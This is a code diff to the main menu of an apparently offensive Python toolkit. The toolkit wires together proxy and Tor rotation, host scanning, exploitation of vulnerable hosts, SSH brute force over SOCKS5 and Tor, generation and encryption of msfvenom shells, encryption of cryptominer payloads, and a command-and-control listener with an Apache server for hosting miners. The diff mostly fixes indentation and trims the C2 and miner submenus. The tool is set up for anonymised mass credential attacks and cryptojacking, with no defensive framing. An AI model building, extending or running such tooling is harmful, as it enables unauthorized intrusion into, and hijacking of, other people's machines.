@@ -13,6 +13,7 @@ from globals import (
     pause_event,
     stop_event,
 )
+
 from modules.proxy_handler import (
     load_proxies,
     test_proxies,
@@ -21,25 +22,28 @@ from modules.proxy_handler import (
     load_checked_proxies,
     clear_proxies,
 )
+
 from modules.host_handler import (
     load_hosts,
     load_ip_ranges,
     test_hosts,
     load_previous_hosts,
 )
+
 from modules.scanner import scan_hosts, show_results, clear_results
 from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
 from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
-from modules.bruteforce import load_wordlists, bruteforce_ssh
+from modules.bruteforce import load_wordlists, python_bruteforce_ssh
 from modules.config_handler import configure_settings
 from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
 from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
 from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
 from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
+from modules.go_bruteforce import run_golang_bruteforce
+
 import os
 import keyboard
-from modules.go_bruteforce import run_golang_bruteforce
-from modules.proxy_handler import load_proxies, test_proxies
+
 
 def main_menu():
     while True:
@@ -71,6 +75,7 @@ def main_menu():
         print("25.) Exit")
 
         choice = input("Enter your choice: ")
+
         if choice == "1":
             add_proxy_sources()
         elif choice == "2":
@@ -111,35 +116,33 @@ def main_menu():
             except ValueError:
                 max_lines = 200
             split_large_csvs(base_dir, max_lines)
-       elif choice == "18":
-    if not global_live_hosts:
-        print("[ERROR] No valid live hosts found.")
-        continue
+        elif choice == "18":
+            if not global_live_hosts:
+                print("[ERROR] No valid live hosts found.")
+                continue
 
-    targets = global_live_hosts
-    usernames, passwords = load_wordlists()
-    if not usernames or not passwords:
-        print("[ERROR] Missing or empty wordlists.")
-        continue
+            targets = global_live_hosts
+            usernames, passwords = load_wordlists()
+            if not usernames or not passwords:
+                print("[ERROR] Missing or empty wordlists.")
+                continue
 
-    print("\n[ SSH Bruteforce Options ]")
-    print("1.) Python-Based Brute Force (Hydra/Paramiko)")
-    print("2.) Golang-Based Brute Force (SOCKS5 + Tor)")
-    print("3.) Return to Main Menu")
+            print("\n[ SSH Bruteforce Options ]")
+            print("1.) Python-Based Brute Force (Hydra/Paramiko)")
+            print("2.) Golang-Based Brute Force (SOCKS5 + Tor)")
+            print("3.) Return to Main Menu")
 
-    bruteforce_choice = input("Enter your choice: ")
+            bruteforce_choice = input("Enter your choice: ")
 
-    if bruteforce_choice == "1":
-        python_bruteforce_ssh(targets, usernames, passwords, max_threads=5)
-    elif bruteforce_choice == "2":
-        golang_bruteforce_ssh()
-    elif bruteforce_choice == "3":
-        continue
-    else:
-        print("[ERROR] Invalid choice. Please enter 1, 2, or 3.")
- 
+            if bruteforce_choice == "1":
+                python_bruteforce_ssh(targets, usernames, passwords, max_threads=5)
+            elif bruteforce_choice == "2":
+                run_golang_bruteforce()
+            elif bruteforce_choice == "3":
+                continue
+            else:
+                print("[ERROR] Invalid choice. Please enter 1, 2, or 3.")
         elif choice == "19":
-            # Run Golang SSH Bruteforce with SOCKS5 proxies
             if not global_live_hosts:
                 print("[ERROR] No valid live hosts found.")
                 continue
@@ -161,7 +164,7 @@ def main_menu():
                 print("[ERROR] Invalid input. Using default (5).")
                 threads = 5
 
-            run_golang_bruteforce(global_live_hosts, username_file, password_file, threads)            
+            run_golang_bruteforce(global_live_hosts, username_file, password_file, threads)
         elif choice == "20":
             configure_settings()
         elif choice == "21":
@@ -187,45 +190,9 @@ def main_menu():
                 if encrypt_choice == "yes":
                     encrypt_generated_shell(shell_path)
         elif choice == "22":
-            print("\n[ Cryptominer Management ]")
-            print("1.) List Cryptominers")
-            print("2.) Encrypt All Cryptominers")
-            print("3.) Return to Main Menu")
-            miner_choice = input("Enter your choice: ")
-            if miner_choice == "1":
-                list_cryptominers()
-            elif miner_choice == "2":
-                encrypt_all_cryptominers()
-            elif miner_choice == "3":
-                continue
+            list_cryptominers()
         elif choice == "23":
-            print("\n[ Command and Control Center ]")
-            print("1.) Start Listener")
-            print("2.) Command Interface")
-            print("3.) Start Apache Server for Cryptominers")
-            print("4.) Stop All Listeners")
-            print("5.) Return to Main Menu")
-            c2_choice = input("Enter your choice: ")
-            if c2_choice == "1":
-                host = input("Enter listener IP (default 0.0.0.0): ") or "0.0.0.0"
-                port = input("Enter listener port (default 4444): ") or "4444"
-                try:
-                    start_listener(host, int(port))
-                except Exception as e:
-                    print(f"[ERROR] Failed to start listener: {e}")
-            elif c2_choice == "2":
-                c2_interface()
-            elif c2_choice == "3":
-                directory = "payloads/cryptominers"
-                port = input("Enter Apache server port (default 80): ") or "80"
-                try:
-                    start_apache_server(directory, int(port))
-                except Exception as e:
-                    print(f"[ERROR] Failed to start Apache server: {e}")
-            elif c2_choice == "4":
-                stop_listeners()
-            elif c2_choice == "5":
-                continue
+            c2_interface()
         elif choice == "24":
             tor_action = input("[INFO] Start Tor (1), Stop Tor (2), Renew Tor IP (3): ")
             if tor_action == "1":
